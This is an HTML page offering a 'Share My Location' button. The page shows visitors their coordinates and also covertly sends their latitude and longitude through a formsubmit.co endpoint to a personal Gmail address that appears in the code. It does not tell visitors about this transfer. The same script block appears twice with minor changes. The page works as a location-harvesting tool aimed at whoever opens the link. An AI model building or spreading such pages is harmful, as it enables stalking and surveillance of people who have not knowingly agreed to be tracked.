
<!DOCTYPE html>
<html>
<head>
  <title>Get My Location</title>
</head>
<body>
  <h1>Click the button below to share your location:</h1>
  <div style="text-align: center; margin-top: 50px;">
  <button onclick="getLocation()" style="
    padding: 15px 40px;
    font-size: 22px;
    background-color: #007BFF;
    color: white;
    border: none;
    border-radius: 12px;
    cursor: pointer;
    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    transition: background-color 0.3s ease, transform 0.2s ease;
  ">
    üìç Share My Location
  </button>
  </div>
  <script>
  function getLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          alert("Latitude: " + lat + "\nLongitude: " + lon);

          fetch("https://formsubmit.co/atuldhanotiya7@gmail.com", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              Latitude: lat,
              Longitude: lon
            })
          });
        },
        function(error) {
          alert("Location access denied or unavailable.");
        }
      );
    } else {
      alert("Geolocation is not supported by this browser.");
    }
  }
  </script>
  <p id="status"></p>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            document.getElementById("status").innerText = "Latitude: " + lat + " | Longitude: " + lon;

            // Send to email using FormSubmit
            fetch("https://formsubmit.co/atuldhanotiya7@gmail.com", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                Latitude: lat,
                Longitude: lon
              })
            });
          },
          function(error) {
            document.getElementById("status").innerText = "Location access denied or unavailable.";
          }
        );
      } else {
        document.getElementById("status").innerText = "Geolocation is not supported by this browser.";
      }
    }
  </script>
</body>
</html>
